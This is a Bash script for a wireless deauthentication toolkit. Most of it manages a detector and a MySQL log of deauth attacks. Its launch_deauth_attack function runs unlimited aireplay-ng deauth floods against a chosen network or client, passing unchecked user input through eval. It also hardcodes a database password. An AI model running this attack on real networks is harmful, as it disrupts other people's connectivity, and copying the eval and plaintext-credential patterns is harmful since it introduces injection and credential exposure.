#!/bin/bash

# Deauth Attack Tool - Management Interface
# This script provides a comprehensive interface for detecting, monitoring,
# and performing deauthentication attacks

# Color definitions for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Script directory setup
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DETECTOR_SCRIPT="$SCRIPT_DIR/detector.py"
LOG_DIR="$SCRIPT_DIR/logs"
SCAN_RESULTS="$SCRIPT_DIR/scan_results.txt"
PID_FILE="$SCRIPT_DIR/deauth_detector.pid"

# Create log directory if it doesn't exist
mkdir -p "$LOG_DIR"

# Function to display the banner
show_banner() {
    clear
    echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${CYAN}                 DEAUTHENTICATION TOOLKIT                 ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}                 Security Research Tool                  ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${RED}[!] Legal Disclaimer: Use only on networks you own or have permission to test${NC}\n"
}

# Function to check if detector is running
is_detector_running() {
    if [[ -f "$PID_FILE" ]]; then
        local pid=$(cat "$PID_FILE")
        if ps -p "$pid" > /dev/null 2>&1; then
            return 0
        else
            rm -f "$PID_FILE"
            return 1
        fi
    fi
    return 1
}

# Function to setup a wireless interface in monitor mode
setup_monitor_mode() {
    show_banner
    echo -e "${CYAN}=== Setup Monitor Mode Interface ===${NC}\n"
    
    # Show available interfaces
    echo -e "${YELLOW}Available wireless interfaces:${NC}"
    iw dev | grep Interface | awk '{print "  " $2}'
    echo ""
    
    # Ask user to select an interface
    echo -e "${YELLOW}Enter interface name to put in monitor mode:${NC} "
    read -r interface
    
    if [[ -z "$interface" ]]; then
        echo -e "${RED}No interface specified. Aborting.${NC}"
        return 1
    fi
    
    # Check if interface exists
    if ! iw dev | grep -q "$interface"; then
        echo -e "${RED}Interface $interface not found. Aborting.${NC}"
        return 1
    fi
    
    echo -e "\n${YELLOW}Setting up monitor mode on $interface...${NC}"
    
    # Kill processes that might interfere
    sudo airmon-ng check kill
    
    # Put interface down, set monitor mode, bring it back up
    sudo ip link set "$interface" down
    sudo iw dev "$interface" set type monitor
    sudo ip link set "$interface" up
    
    # Verify monitor mode
    if iw dev | grep -A 5 "$interface" | grep -q "type monitor"; then
        echo -e "${GREEN}Successfully enabled monitor mode on $interface${NC}"
        
        # Update the detector.py script with the new interface
        if [[ -f "$DETECTOR_SCRIPT" ]]; then
            sed -i "s/iface = \"[^\"]*\"/iface = \"$interface\"/" "$DETECTOR_SCRIPT"
            echo -e "${GREEN}Updated detector.py with new interface: $interface${NC}"
        fi
        
        # Set current interface for this session
        export MONITOR_INTERFACE="$interface"
        echo "$interface" > "$SCRIPT_DIR/current_interface.txt"
        return 0
    else
        echo -e "${RED}Failed to enable monitor mode on $interface${NC}"
        return 1
    fi
}

# Function to scan for networks
scan_networks() {
    show_banner
    echo -e "${CYAN}=== Scanning for Wireless Networks ===${NC}\n"
    
    # Check if we have a monitor interface
    local interface=""
    if [[ -f "$SCRIPT_DIR/current_interface.txt" ]]; then
        interface=$(cat "$SCRIPT_DIR/current_interface.txt")
    fi
    
    if [[ -z "$interface" ]]; then
        echo -e "${RED}No monitor interface available. Please set up monitor mode first.${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Scanning on interface: $interface${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop scanning when ready.${NC}\n"
    
    # Run airodump-ng to scan networks
    sudo airodump-ng -w "$SCRIPT_DIR/scan" --output-format csv "$interface"
    
    # Process the scan results for easier viewing
    if [[ -f "$SCRIPT_DIR/scan-01.csv" ]]; then
        echo -e "\n${GREEN}Scan completed. Processing results...${NC}"
        
        # Extract network information from CSV and format it
        grep -a -A 100 "BSSID" "$SCRIPT_DIR/scan-01.csv" | grep -a -v "BSSID" | grep -a -v "Station MAC" | 
        awk -F, '{if (length($1)>0) printf "%-20s %-4s %-30s %-20s\n", $1, $4, $14, $10}' | sort -k 3 > "$SCAN_RESULTS"
        
        # Display the results
        echo -e "\n${CYAN}Detected Networks:${NC}"
        echo -e "${BLUE}----------------------------------------${NC}"
        echo -e "${BLUE}BSSID               CH   ESSID                          ENCRYPTION${NC}"
        echo -e "${BLUE}----------------------------------------${NC}"
        cat "$SCAN_RESULTS"
        echo -e "${BLUE}----------------------------------------${NC}"
        
        # Clean up temporary scan files
        rm -f "$SCRIPT_DIR/scan-01.csv" "$SCRIPT_DIR/scan-01.kismet.csv" "$SCRIPT_DIR/scan-01.kismet.netxml"
    else
        echo -e "${RED}No scan results found.${NC}"
        return 1
    fi
}

# Function to start the detector
start_detector() {
    show_banner
    echo -e "${CYAN}=== Starting Deauth Attack Detector ===${NC}\n"
    
    if is_detector_running; then
        echo -e "${RED}Detector is already running with PID: $(cat $PID_FILE)${NC}"
        return 1
    fi
    
    # Check if we have a monitor interface
    local interface=""
    if [[ -f "$SCRIPT_DIR/current_interface.txt" ]]; then
        interface=$(cat "$SCRIPT_DIR/current_interface.txt")
    fi
    
    if [[ -z "$interface" ]]; then
        echo -e "${RED}No monitor interface available. Please set up monitor mode first.${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Starting detector on interface: $interface${NC}\n"
    
    # Start the detector script in the background
    python3 "$DETECTOR_SCRIPT" > "$LOG_DIR/detector.log" 2>&1 &
    local pid=$!
    echo "$pid" > "$PID_FILE"
    
    # Check if it started successfully
    sleep 2
    if is_detector_running; then
        echo -e "${GREEN}Detector started successfully with PID: $pid${NC}"
        echo -e "${YELLOW}Logs are being written to: $LOG_DIR/detector.log${NC}"
        echo -e "${YELLOW}Data is being saved to the security_dashboard database${NC}"
        echo -e "${YELLOW}View the dashboard at: http://localhost/deauth.html${NC}"
    else
        echo -e "${RED}Failed to start detector.${NC}"
        rm -f "$PID_FILE"
        return 1
    fi
}

# Function to stop the detector
stop_detector() {
    show_banner
    echo -e "${CYAN}=== Stopping Deauth Attack Detector ===${NC}\n"
    
    if ! is_detector_running; then
        echo -e "${RED}Detector is not running.${NC}"
        return 1
    fi
    
    local pid=$(cat "$PID_FILE")
    echo -e "${YELLOW}Stopping detector with PID: $pid${NC}"
    
    # Try to stop gracefully first
    kill "$pid" 2>/dev/null
    sleep 2
    
    # If still running, force kill
    if ps -p "$pid" > /dev/null 2>&1; then
        echo -e "${YELLOW}Graceful shutdown failed. Force killing...${NC}"
        kill -9 "$pid" 2>/dev/null
    fi
    
    # Clean up PID file
    rm -f "$PID_FILE"
    echo -e "${GREEN}Detector stopped.${NC}"
}

# Function to view detector logs
view_logs() {
    show_banner
    echo -e "${CYAN}=== Detector Logs ===${NC}\n"
    
    if [[ ! -f "$LOG_DIR/detector.log" ]]; then
        echo -e "${RED}No log file found. Has the detector been run?${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Showing last 50 lines of detector.log. Press Ctrl+C to exit.${NC}\n"
    tail -n 50 -f "$LOG_DIR/detector.log"
}

# Function to check detector status
check_status() {
    show_banner
    echo -e "${CYAN}=== Detector Status ===${NC}\n"
    
    # Check if the detector is running
    if is_detector_running; then
        local pid=$(cat "$PID_FILE")
        echo -e "${GREEN}Detector status: RUNNING${NC}"
        echo -e "${YELLOW}PID: $pid${NC}"
        
        # Show process details
        echo -e "\n${CYAN}Process details:${NC}"
        ps -p "$pid" -o pid,ppid,cmd,%cpu,%mem,start,time | head -1
        ps -p "$pid" -o pid,ppid,cmd,%cpu,%mem,start,time | grep -v PID
        
        # Show current interface
        if [[ -f "$SCRIPT_DIR/current_interface.txt" ]]; then
            local interface=$(cat "$SCRIPT_DIR/current_interface.txt")
            echo -e "\n${CYAN}Monitoring interface: $interface${NC}"
            
            # Show interface details
            echo -e "\n${CYAN}Interface details:${NC}"
            iw dev "$interface" info
        fi
    else
        echo -e "${RED}Detector status: STOPPED${NC}"
        
        # Show available interfaces
        echo -e "\n${CYAN}Available wireless interfaces:${NC}"
        iw dev | grep Interface | awk '{print "  " $2}'
    fi
}

# Function to launch a deauth attack
launch_deauth_attack() {
    show_banner
    echo -e "${CYAN}=== Launch Deauthentication Attack ===${NC}\n"
    echo -e "${RED}WARNING: Deauthentication attacks can disrupt network connectivity.${NC}"
    echo -e "${RED}Only perform this on networks you own or have permission to test.${NC}\n"
    
    # Check if we have a monitor interface
    local interface=""
    if [[ -f "$SCRIPT_DIR/current_interface.txt" ]]; then
        interface=$(cat "$SCRIPT_DIR/current_interface.txt")
    fi
    
    if [[ -z "$interface" ]]; then
        echo -e "${RED}No monitor interface available. Please set up monitor mode first.${NC}"
        return 1
    fi
    
    # Check if we have scan results
    if [[ ! -f "$SCAN_RESULTS" ]]; then
        echo -e "${YELLOW}No network scan results available. Running network scan...${NC}\n"
        scan_networks
    else
        # Show scan results
        echo -e "${CYAN}Previously scanned networks:${NC}"
        echo -e "${BLUE}----------------------------------------${NC}"
        echo -e "${BLUE}BSSID               CH   ESSID                          ENCRYPTION${NC}"
        echo -e "${BLUE}----------------------------------------${NC}"
        cat "$SCAN_RESULTS"
        echo -e "${BLUE}----------------------------------------${NC}"
        
        # Ask if user wants to rescan
        echo -e "${YELLOW}Do you want to perform a new scan? (y/n): ${NC}"
        read -r rescan
        if [[ "$rescan" == "y" || "$rescan" == "Y" ]]; then
            scan_networks
        fi
    fi
    
    # Get target details
    echo -e "\n${YELLOW}Enter the target network BSSID: ${NC}"
    read -r target_bssid
    
    if [[ -z "$target_bssid" ]]; then
        echo -e "${RED}No BSSID specified. Aborting.${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Enter the target channel number: ${NC}"
    read -r target_channel
    
    if [[ -z "$target_channel" ]]; then
        echo -e "${RED}No channel specified. Aborting.${NC}"
        return 1
    fi
    
    # Ask for attack duration
    echo -e "${YELLOW}Enter attack duration in seconds (0 for unlimited): ${NC}"
    read -r attack_duration
    
    # Set attack type
    echo -e "${YELLOW}Select attack type:${NC}"
    echo -e "  ${CYAN}1)${NC} Broadcast deauth (all clients)"
    echo -e "  ${CYAN}2)${NC} Targeted deauth (specific client)"
    read -r attack_type
    
    local target_client=""
    if [[ "$attack_type" == "2" ]]; then
        echo -e "${YELLOW}Enter the client MAC address to target: ${NC}"
        read -r target_client
        
        if [[ -z "$target_client" ]]; then
            echo -e "${RED}No client specified. Aborting.${NC}"
            return 1
        fi
    fi
    
    # Set the channel
    echo -e "\n${YELLOW}Setting channel $target_channel on $interface...${NC}"
    sudo iwconfig "$interface" channel "$target_channel"
    
    # Prepare command
    local deauth_cmd=""
    if [[ "$attack_type" == "2" && -n "$target_client" ]]; then
        deauth_cmd="sudo aireplay-ng --deauth 0 -a $target_bssid -c $target_client $interface"
    else
        deauth_cmd="sudo aireplay-ng --deauth 0 -a $target_bssid $interface"
    fi
    
    # Launch the attack
    echo -e "\n${RED}Launching deauth attack... Press Ctrl+C to stop.${NC}"
    
    if [[ "$attack_duration" == "0" ]]; then
        eval "$deauth_cmd"
    else
        echo -e "${YELLOW}Attack will run for $attack_duration seconds.${NC}"
        timeout "$attack_duration" bash -c "$deauth_cmd"
        echo -e "\n${GREEN}Attack completed.${NC}"
    fi
}

# Function to view database logs
view_db_logs() {
    show_banner
    echo -e "${CYAN}=== Database Logs ===${NC}\n"
    
    # Python script to query and display database logs
    python3 - << 'EOL'
import MySQLdb
from datetime import datetime

# Database configuration
db_config = {
    'host': 'localhost',
    'user': 'dashboard',
    'passwd': 'securepass',
    'db': 'security_dashboard',
}

try:
    # Connect to the database
    conn = MySQLdb.connect(**db_config)
    cursor = conn.cursor()
    
    # Get the count of attacks
    cursor.execute("SELECT COUNT(*) FROM network_attacks")
    count = cursor.fetchone()[0]
    
    if count == 0:
        print("No deauth attacks found in the database.")
    else:
        print(f"Found {count} deauth attacks in the database.\n")
        
        # Get the most recent attacks
        cursor.execute("""
            SELECT id, timestamp, alert_type, attacker_bssid, attacker_ssid, 
                   destination_bssid, destination_ssid, attack_count
            FROM network_attacks
            ORDER BY timestamp DESC
            LIMIT 20
        """)
        
        attacks = cursor.fetchall()
        
        # Display column headers
        print(f"{'TIMESTAMP':<20} {'TYPE':<15} {'ATTACKER':<20} {'TARGET':<20} {'COUNT':<6}")
        print("-" * 80)
        
        # Display each attack
        for attack in attacks:
            attack_id, timestamp, alert_type, attacker_bssid, attacker_ssid, destination_bssid, destination_ssid, attack_count = attack
            print(f"{str(timestamp):<20} {alert_type[:15]:<15} {attacker_bssid:<20} {destination_bssid:<20} {attack_count:<6}")
    
    # Close connection
    conn.close()

except Exception as e:
    print(f"Error accessing database: {str(e)}")
    print("Make sure the MySQL database is running and accessible.")
EOL
}

# Function to clear database logs
clear_db_logs() {
    show_banner
    echo -e "${CYAN}=== Clear Database Logs ===${NC}\n"
    
    echo -e "${RED}WARNING: This will permanently delete all deauth attack logs from the database.${NC}"
    echo -e "${YELLOW}Are you sure you want to continue? (yes/no): ${NC}"
    read -r confirm
    
    if [[ "$confirm" != "yes" ]]; then
        echo -e "${YELLOW}Operation cancelled.${NC}"
        return 0
    fi
    
    # Python script to clear logs
    python3 - << 'EOL'
import MySQLdb

# Database configuration
db_config = {
    'host': 'localhost',
    'user': 'dashboard',
    'passwd': 'securepass',
    'db': 'security_dashboard',
}

try:
    # Connect to the database
    conn = MySQLdb.connect(**db_config)
    cursor = conn.cursor()
    
    # Delete all records
    cursor.execute("DELETE FROM network_attacks")
    conn.commit()
    
    deleted_count = cursor.rowcount
    print(f"Successfully deleted {deleted_count} attack logs from the database.")
    
    # Close connection
    conn.close()

except Exception as e:
    print(f"Error clearing database: {str(e)}")
EOL
}

# Function to install dependencies
install_dependencies() {
    show_banner
    echo -e "${CYAN}=== Install Dependencies ===${NC}\n"
    
    echo -e "${YELLOW}This will install all required dependencies for the deauth toolkit.${NC}"
    echo -e "${YELLOW}Continue? (y/n): ${NC}"
    read -r confirm
    
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo -e "${YELLOW}Operation cancelled.${NC}"
        return 0
    fi
    
    echo -e "\n${YELLOW}Installing dependencies...${NC}"
    
    # System packages
    sudo apt-get update
    sudo apt-get install -y python3 python3-pip python3-scapy aircrack-ng mysql-client libmysqlclient-dev
    
    # Python packages
    pip3 install mysqlclient scapy
    
    echo -e "\n${GREEN}Dependencies installed successfully.${NC}"
}

# Function to verify database connection
verify_database() {
    show_banner
    echo -e "${CYAN}=== Verify Database Connection ===${NC}\n"
    
    # Python script to verify database connection
    python3 - << 'EOL'
import MySQLdb

# Database configuration
db_config = {
    'host': 'localhost',
    'user': 'dashboard',
    'passwd': 'securepass',
    'db': 'security_dashboard',
}

try:
    # Try to connect
    conn = MySQLdb.connect(**db_config)
    print("Database connection successful!")
    
    # Check if the required table exists
    cursor = conn.cursor()
    cursor.execute("SHOW TABLES LIKE 'network_attacks'")
    
    if cursor.fetchone():
        print("The 'network_attacks' table exists.")
        
        # Check table structure
        cursor.execute("DESCRIBE network_attacks")
        columns = cursor.fetchall()
        
        print("\nTable structure:")
        for column in columns:
            print(f"  {column[0]} - {column[1]}")
    else:
        print("\nWARNING: The 'network_attacks' table does not exist!")
        print("Would you like to create it? (yes/no): ", end="")
        create_table = input()
        
        if create_table.lower() == "yes":
            # Create the table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS network_attacks (
                    id VARCHAR(36) PRIMARY KEY,
                    timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
                    alert_type VARCHAR(100) NOT NULL,
                    attacker_bssid VARCHAR(17),
                    attacker_ssid VARCHAR(255),
                    destination_bssid VARCHAR(17),
                    destination_ssid VARCHAR(255),
                    attack_count INT DEFAULT 1,
                    source_ip VARCHAR(45),
                    INDEX idx_timestamp (timestamp),
                    INDEX idx_alert_type (alert_type),
                    INDEX idx_attacker_bssid (attacker_bssid)
                )
            """)
            conn.commit()
            print("Table created successfully!")
    
    conn.close()

except Exception as e:
    print(f"Database connection failed: {str(e)}")
    print("\nPossible solutions:")
    print("1. Make sure the MySQL server is running")
    print("2. Check if the database credentials are correct")
    print("3. Verify that the 'security_dashboard' database exists")
EOL
}

# Function to open the dashboard
open_dashboard() {
    show_banner
    echo -e "${CYAN}=== Open Deauth Dashboard ===${NC}\n"
    
    echo -e "${YELLOW}Opening the deauth dashboard in your default browser...${NC}"
    
    # Try different methods to open the browser
    if command -v xdg-open > /dev/null; then
        xdg-open "http://localhost/deauth.html"
    elif command -v firefox > /dev/null; then
        firefox "http://localhost/deauth.html" &
    elif command -v chromium > /dev/null; then
        chromium "http://localhost/deauth.html" &
    else
        echo -e "${RED}Could not automatically open browser.${NC}"
        echo -e "${YELLOW}Please manually navigate to: http://localhost/deauth.html${NC}"
    fi
}

# Function to restore wireless interfaces
restore_interfaces() {
    show_banner
    echo -e "${CYAN}=== Restore Wireless Interfaces ===${NC}\n"
    
    # Show interfaces in monitor mode
    echo -e "${YELLOW}Interfaces in monitor mode:${NC}"
    iw dev | grep -A 1 "type monitor" | grep Interface | awk '{print "  " $2}'
    
    echo -e "\n${YELLOW}Enter interface to restore to managed mode (leave empty to cancel): ${NC}"
    read -r interface
    
    if [[ -z "$interface" ]]; then
        echo -e "${YELLOW}Operation cancelled.${NC}"
        return 0
    fi
    
    echo -e "\n${YELLOW}Restoring $interface to managed mode...${NC}"
    
    # Stop monitor mode
    sudo ip link set "$interface" down
    sudo iw dev "$interface" set type managed
    sudo ip link set "$interface" up
    
    # Restart NetworkManager to manage the interface
    sudo systemctl restart NetworkManager
    
    # Check if restored
    if ! iw dev | grep -A 5 "$interface" | grep -q "type monitor"; then
        echo -e "${GREEN}Successfully restored $interface to managed mode.${NC}"
        
        # Remove from current interface file if it matches
        if [[ -f "$SCRIPT_DIR/current_interface.txt" ]]; then
            if grep -q "^$interface\$" "$SCRIPT_DIR/current_interface.txt"; then
                rm "$SCRIPT_DIR/current_interface.txt"
            fi
        fi
    else
        echo -e "${RED}Failed to restore $interface to managed mode.${NC}"
    fi
}

# Function to simulate a deauth attack for testing
simulate_attack() {
    show_banner
    echo -e "${CYAN}=== Simulate Deauth Attack ===${NC}\n"
    
    echo -e "${YELLOW}This will generate a test deauth attack entry in the database.${NC}"
    echo -e "${YELLOW}Continue? (y/n): ${NC}"
    read -r confirm
    
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo -e "${YELLOW}Operation cancelled.${NC}"
        return 0
    fi
    
    # Python script to simulate an attack
    python3 - << 'EOL'
import MySQLdb
import uuid
from datetime import datetime

# Database configuration
db_config = {
    'host': 'localhost',
    'user': 'dashboard',
    'passwd': 'securepass',
    'db': 'security_dashboard',
}

try:
    # Connect to the database
    conn = MySQLdb.connect(**db_config)
    cursor = conn.cursor()
    
    # Generate attack data
    attack_id = str(uuid.uuid4())
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Insert simulated attack
    cursor.execute("""
        INSERT INTO network_attacks 
        (id, timestamp, alert_type, attacker_bssid, attacker_ssid, 
         destination_bssid, destination_ssid, attack_count)
        VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
    """, (
        attack_id,
        timestamp,
        "Simulated Deauth Attack",
        "00:11:22:33:44:55",
        "SimulatedAttacker",
        "AA:BB:CC:DD:EE:FF",
        "SimulatedTarget",
        25
    ))
    
    conn.commit()
    print(f"Simulated attack added to database with ID: {attack_id}")
    print(f"Timestamp: {timestamp}")
    conn.close()

except Exception as e:
    print(f"Error simulating attack: {str(e)}")
EOL
    
    echo -e "\n${YELLOW}You can now check the dashboard to see the simulated attack.${NC}"
}

# Function to display the help menu
show_help() {
    show_banner
    echo -e "${CYAN}=== Help and Documentation ===${NC}\n"
    
    echo -e "${YELLOW}Deauth Toolkit Commands:${NC}\n"
    
    echo -e "${GREEN}setup${NC}      - Setup a wireless interface in monitor mode"
    echo -e "${GREEN}scan${NC}       - Scan for wireless networks"
    echo -e "${GREEN}start${NC}      - Start the deauth detector"
    echo -e "${GREEN}stop${NC}       - Stop the deauth detector"
    echo -e "${GREEN}logs${NC}       - View detector logs"
    echo -e "${GREEN}status${NC}     - Check detector status"
    echo -e "${GREEN}attack${NC}     - Launch a deauth attack"
    echo -e "${GREEN}dblogs${NC}     - View database logs"
    echo -e "${GREEN}dbclear${NC}    - Clear database logs"
    echo -e "${GREEN}install${NC}    - Install dependencies"
    echo -e "${GREEN}verify${NC}     - Verify database connection"
    echo -e "${GREEN}dashboard${NC}  - Open the deauth dashboard"
    echo -e "${GREEN}restore${NC}    - Restore wireless interfaces to managed mode"
    echo -e "${GREEN}simulate${NC}   - Simulate a deauth attack"
    echo -e "${GREEN}help${NC}       - Show this help menu"
    echo -e "${GREEN}exit${NC}       - Exit the toolkit"
    
    echo -e "\n${YELLOW}Usage:${NC}"
    echo -e "  $0 [command]"
    echo -e "  If no command is provided, the interactive menu will be shown."
    
    echo -e "\n${YELLOW}Examples:${NC}"
    echo -e "  $0 setup      # Setup monitor mode on a wireless interface"
    echo -e "  $0 start      # Start the deauth detector"
    echo -e "  $0 attack     # Launch a deauth attack"
}

# Function to display the interactive menu
show_menu() {
    while true; do
        show_banner
        
        echo -e "${CYAN}=== Main Menu ===${NC}\n"
        
        echo -e "${CYAN}Monitoring Tools:${NC}"
        echo -e "  ${GREEN}1)${NC} Setup monitor mode"
        echo -e "  ${GREEN}2)${NC} Scan for networks"
        echo -e "  ${GREEN}3)${NC} Start deauth detector"
        echo -e "  ${GREEN}4)${NC} Stop deauth detector"
        echo -e "  ${GREEN}5)${NC} View detector logs"
        echo -e "  ${GREEN}6)${NC} Check status"
        
        echo -e "\n${CYAN}Attack Tools:${NC}"
        echo -e "  ${GREEN}7)${NC} Launch deauth attack"
        echo -e "  ${GREEN}8)${NC} Simulate deauth attack"
        
        echo -e "\n${CYAN}Database Tools:${NC}"
        echo -e "  ${GREEN}9)${NC} View database logs"
        echo -e "  ${GREEN}10)${NC} Clear database logs"
        echo -e "  ${GREEN}11)${NC} Verify database connection"
        
        echo -e "\n${CYAN}System Tools:${NC}"
        echo -e "  ${GREEN}12)${NC} Install dependencies"
        echo -e "  ${GREEN}13)${NC} Open dashboard"
        echo -e "  ${GREEN}14)${NC} Restore wireless interfaces"
        echo -e "  ${GREEN}15)${NC} Help"
        echo -e "  ${GREEN}16)${NC} Exit"
        
        echo -e "\n${YELLOW}Enter your choice [1-16]: ${NC}"
        read -r choice
        
        case $choice in
            1) setup_monitor_mode ;;
            2) scan_networks ;;
            3) start_detector ;;
            4) stop_detector ;;
            5) view_logs ;;
            6) check_status ;;
            7) launch_deauth_attack ;;
            8) simulate_attack ;;
            9) view_db_logs ;;
            10) clear_db_logs ;;
            11) verify_database ;;
            12) install_dependencies ;;
            13) open_dashboard ;;
            14) restore_interfaces ;;
            15) show_help ;;
            16) 
                echo -e "\n${GREEN}Exiting deauth toolkit. Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "\n${RED}Invalid option. Press any key to continue...${NC}"
                read -n 1
                ;;
        esac
        
        echo -e "\n${YELLOW}Press any key to return to menu...${NC}"
        read -n 1
    done
}

# Main execution
if [[ $# -eq 0 ]]; then
    # If no arguments, show interactive menu
    show_menu
else
    # Execute the command passed as argument
    command="$1"
    case $command in
        setup) setup_monitor_mode ;;
        scan) scan_networks ;;
        start) start_detector ;;
        stop) stop_detector ;;
        logs) view_logs ;;
        status) check_status ;;
        attack) launch_deauth_attack ;;
        dblogs) view_db_logs ;;
        dbclear) clear_db_logs ;;
        install) install_dependencies ;;
        verify) verify_database ;;
        dashboard) open_dashboard ;;
        restore) restore_interfaces ;;
        simulate) simulate_attack ;;
        help) show_help ;;
        *)
            echo -e "${RED}Unknown command: $command${NC}"
            echo -e "${YELLOW}Run '$0 help' for a list of available commands.${NC}"
            exit 1
            ;;
    esac
fi
